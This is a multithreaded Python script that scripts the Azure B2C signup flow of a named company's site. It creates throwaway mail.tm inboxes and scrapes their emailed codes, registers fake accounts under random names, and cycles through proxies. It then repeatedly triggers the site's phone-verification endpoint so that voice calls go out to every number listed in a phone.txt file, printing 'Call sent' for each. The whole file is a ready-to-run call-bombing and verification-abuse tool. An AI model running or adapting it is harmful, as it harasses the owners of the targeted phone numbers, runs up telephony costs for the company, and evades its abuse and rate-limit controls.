import requests
import random,string
from time import sleep
import threading
import os
from bs4 import BeautifulSoup
import names
import phonenumbers
import pycountry
import phone_iso3166
from phone_iso3166.country import *
import re
import sys
print('Please make sure that phone.txt file contains numbers and vpn.txt file contains the proxies.')
input('Press enter to continue..')

def get_temporary_email() :
 while True:
  try:
    proxy = random.choice(prx)
    proxies = {}
    proxies['http'] = 'http://'+proxy
    proxies['https'] = 'http://'+proxy
    
    response = requests.get('https://api.mail.tm/domains', proxies=proxies)
    domain = response.text.split('domain":"')[1].split('"')[0]
    user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=9))
    email = f'{user}@{domain}'.lower()
    headers = {
        'Content-Type': 'application/json',
    }
    
    json_data = {
        'address': email,
        'password': 'secret',
    }
    
    response = requests.post('https://api.mail.tm/accounts', headers=headers, json=json_data, proxies=proxies)
    if 'used":0,"isDisabled":false' not in response.text:
        print('Failed to make an email')
    
    headers = {
        'Content-Type': 'application/json',
    }
    
    json_data = {
        'address': email,
        'password': 'secret',
    }
    
    response = requests.post('https://api.mail.tm/token', headers=headers, json=json_data,proxies=proxies)
    token = response.text.split('token":"')[1].split('"')[0]
    return email,token
  except Exception as E:
    print(E)
    continue
def get_Otp(token):
 while True:
  try:
    for x in range(90):
        proxy = random.choice(prx)
        proxies = {}
        proxies['http'] = 'http://'+proxy
        proxies['https'] = 'http://'+proxy
        sleep(.5)
        headers = {
            'Authorization': f'Bearer {token}',
        }
        
        response = requests.get('https://api.mail.tm/messages', headers=headers, proxies=proxies)
        response_text = response.text
        if 'Microsoft' in response.text:
            match = re.search(r'(?:code|lautet|is)[:\s]*(\d{4,6})', response_text, re.IGNORECASE) or re.search(r'\b\d{4,6}\b', response_text)
            otp = match.group(1) if match and match.lastindex else (match.group(0) if match else None)
            return otp
  except Exception as E:
    print(E)
    continue
good = 0
phones = open("phone.txt", "r")
aader = phones.read()
gm = aader.splitlines()
phones.close()
random.shuffle(gm)
gm = gm * 15
phones = open("vpn.txt", "r")
aader = phones.read()
prx = aader.splitlines()
phones.close()
sor = int(input('Enter number of threads '))
proxies = {}
def script():
 global good
 while True:
  try:
    proxy = random.choice(prx)
    proxies['http'] = 'http://'+proxy
    proxies['https'] = 'http://'+proxy
    response = requests.get('https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/oauth2/v2.0/authorize?client_id=2397c50b-c193-4dba-a78f-481f2c5621a4&nonce=defaultNonce&redirect_uri=https%3A%2F%2Fwww.cfsbrands.com%2Fapi%2Fauth&scope=openid+offline_access&response_type=code+id_token&response_mode=form_post&state={%22guestCartId%22:%22%22}',proxies=proxies)
    cookies = response.cookies.get_dict()
    content = response.text
    csrf = cookies.get('x-ms-cpim-csrf')
    state = content.split('StateProperties=')[1].split('"')[0]
    email = get_temporary_email()
    token = email[1]
    email = email[0]
    user1 = email.split('@')[0]
    domain1 = email.split('@')[1]
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://cfsbrandsb2c.b2clogin.com',
        'Referer': 'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/oauth2/v2.0/authorize?client_id=2397c50b-c193-4dba-a78f-481f2c5621a4&nonce=defaultNonce&redirect_uri=https%3A%2F%2Fwww.cfsbrands.com%2Fapi%2Fauth&scope=openid+offline_access&response_type=code+id_token&response_mode=form_post&state={%22guestCartId%22:%22%22}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    data = f'&email={user1}%40{domain1}'
    
    response = requests.post(
        f'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/SelfAsserted/DisplayControlAction/vbeta/emailVerificationControl/SendCode?tx=StateProperties={state}&p=B2C_1_Signup',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies,
    )
    otp = get_Otp(token)
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) +'1aA!'
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://cfsbrandsb2c.b2clogin.com',
        'Referer': 'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/oauth2/v2.0/authorize?client_id=2397c50b-c193-4dba-a78f-481f2c5621a4&nonce=defaultNonce&redirect_uri=https%3A%2F%2Fwww.cfsbrands.com%2Fapi%2Fauth&scope=openid+offline_access&response_type=code+id_token&response_mode=form_post&state={%22guestCartId%22:%22%22}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    data = f'&email={user1}%40{domain1}&emailVerificationCode={otp}'
    
    response = requests.post(
        f'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/SelfAsserted/DisplayControlAction/vbeta/emailVerificationControl/VerifyCode?tx=StateProperties={state}&p=B2C_1_Signup',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://cfsbrandsb2c.b2clogin.com',
        'Referer': 'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/oauth2/v2.0/authorize?client_id=2397c50b-c193-4dba-a78f-481f2c5621a4&nonce=defaultNonce&redirect_uri=https%3A%2F%2Fwww.cfsbrands.com%2Fapi%2Fauth&scope=openid+offline_access&response_type=code+id_token&response_mode=form_post&state={%22guestCartId%22:%22%22}',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    data = f'email={user1}%40{domain1}&emailVerificationCode={otp}&newPassword={password}&reenterPassword={password}&givenName={names.get_first_name()}&surname={names.get_last_name()}&country=United+States&request_type=RESPONSE'
    
    response = requests.post(
        f'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/SelfAsserted?tx=StateProperties={state}&p=B2C_1_Signup',
        cookies=cookies,
        headers=headers,
        data=data,
        proxies=proxies,
    )

    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Referer': 'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/oauth2/v2.0/authorize?client_id=2397c50b-c193-4dba-a78f-481f2c5621a4&nonce=defaultNonce&redirect_uri=https%3A%2F%2Fwww.cfsbrands.com%2Fapi%2Fauth&scope=openid+offline_access&response_type=code+id_token&response_mode=form_post&state={%22guestCartId%22:%22%22}',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    response = requests.get(
        f'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/api/SelfAsserted/confirmed?csrf_token={csrf}&tx=StateProperties={state}&p=B2C_1_Signup&diags=%7B%22pageViewId%22%3A%2216605156-1967-4aaa-a7d1-7b018b301082%22%2C%22pageId%22%3A%22SelfAsserted%22%2C%22trace%22%3A%5B%7B%22ac%22%3A%22T005%22%2C%22acST%22%3A1730880714%2C%22acD%22%3A7%7D%2C%7B%22ac%22%3A%22T021%20-%20URL%3Ahttps%3A%2F%2Fcfsbrandsaadpublic.blob.core.windows.net%2Fb2cpublic%2Ftemplates%2FAzureBlue%2Fsignup.html%3Fui_locales%3Den%22%2C%22acST%22%3A1730880714%2C%22acD%22%3A14%7D%2C%7B%22ac%22%3A%22T019%22%2C%22acST%22%3A1730880714%2C%22acD%22%3A4%7D%2C%7B%22ac%22%3A%22T004%22%2C%22acST%22%3A1730880714%2C%22acD%22%3A3%7D%2C%7B%22ac%22%3A%22T003%22%2C%22acST%22%3A1730880714%2C%22acD%22%3A3%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1730880715%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T030Online%22%2C%22acST%22%3A1730880715%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T035%22%2C%22acST%22%3A1730880715%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T033%20id%3A%20emailVerificationControl%2C%20type%3A%20VerificationControl%2C%20action%3A%20SendCodeT010%22%2C%22acST%22%3A1730880806%2C%22acD%22%3A1903%7D%2C%7B%22ac%22%3A%22T033%20id%3A%20emailVerificationControl%2C%20type%3A%20VerificationControl%2C%20action%3A%20VerifyCodeT010%22%2C%22acST%22%3A1730880859%2C%22acD%22%3A1026%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1730880923%2C%22acD%22%3A3688%7D%2C%7B%22ac%22%3A%22T002%22%2C%22acST%22%3A1730880927%2C%22acD%22%3A0%7D%2C%7B%22ac%22%3A%22T017T010%22%2C%22acST%22%3A1730880923%2C%22acD%22%3A3689%7D%5D%7D&ui_locales=de',
        cookies=cookies,
        headers=headers,
        proxies=proxies,
    )
    new_cookies = response.cookies.get_dict()
    cookies.update(new_cookies) 
    csrf = cookies.get('x-ms-cpim-csrf')
    content = response.text
    state = content.split('StateProperties=')[1].split('"')[0]
    url = response.url
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'ar,en;q=0.9,pt;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://cfsbrandsb2c.b2clogin.com',
        'Referer': url,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': csrf,
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    
    
    
    for x in range(3):
        proxy = random.choice(prx)
        proxies['http'] = 'http://'+proxy
        proxies['https'] = 'http://'+proxy
        
        number = random.choice(gm)
        data = {
            'request_type': 'VERIFICATION_REQUEST',
            'auth_type': 'dialphone',
            'id': 'UserAsserted',
            'number': f'+{number}',
        }
        
        response = requests.post(
            f'https://cfsbrandsb2c.b2clogin.com/cfsbrandsb2c.onmicrosoft.com/B2C_1_Signup/Phonefactor/verify?tx=StateProperties={state}&p=B2C_1_Signup',
            cookies=cookies,
            headers=headers,
            data=data,
            proxies=proxies,
        )

        if 'status":"200' in response.text:
            print(f'Call sent => +{number}')
        else:
            print(f'Call failed => +{number}, ERROR_CAUSE_FAILED -> {response.text}')
  except Exception as E:
        if 'empty sequence' in str(E):
                print('ERROR DETECTED --> Please make sure that phone.txt file contains numbers and vpn.txt file contains the proxies.')
                input('Press enter to continue..')
                sys.exit()
        else:
                print(E)
                continue
threads = []
for i in range(sor):
    threads.append(threading.Thread(target=script))

# Start each of the new threads
for thread in threads:
    thread.start()

for thread in threads:
    thread.join()

